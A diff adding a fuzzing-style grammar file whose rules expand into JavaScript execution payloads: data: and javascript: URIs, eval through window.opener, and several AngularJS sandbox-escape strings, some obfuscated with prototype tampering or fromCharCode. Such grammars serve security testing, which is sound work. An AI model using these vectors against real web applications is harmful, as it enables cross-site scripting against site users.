@@ -1,0 +1,23 @@
+# challenge trigger
+<trigger> = console.log(location.origin)
+
+<trigger_function> = function () {<trigger_code>}()
+
+<trigger_src> = data:text/html,<trigger_code>
+<trigger_src> = data:text/xhtml,<trigger_code>
+<trigger_src> = data:text/html,<lt>script<gt><trigger_code><lt>/script<gt>
+<trigger_src> = data:text/javascript,<trigger_code>
+<trigger_src> = javascript:<trigger_code>
+
+<trigger_code> = <trigger>
+<trigger_code> = window.opener.eval('<trigger>')
+<trigger_code> = window.opener.parent.eval('<trigger>')
+<trigger_code> = constructor.constructor('<trigger>')()
+<trigger_code> = a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'<trigger>')()
+<trigger_code> = toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","<trigger>"].sort(toString.constructor)
+<trigger_code> = {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('<trigger>')()
+<trigger_code> = {}.")));<trigger>//";
+<trigger_code> = 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };<trigger>//';
+<trigger_code> = constructor.constructor('<trigger>')()
+<trigger_code> = toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+
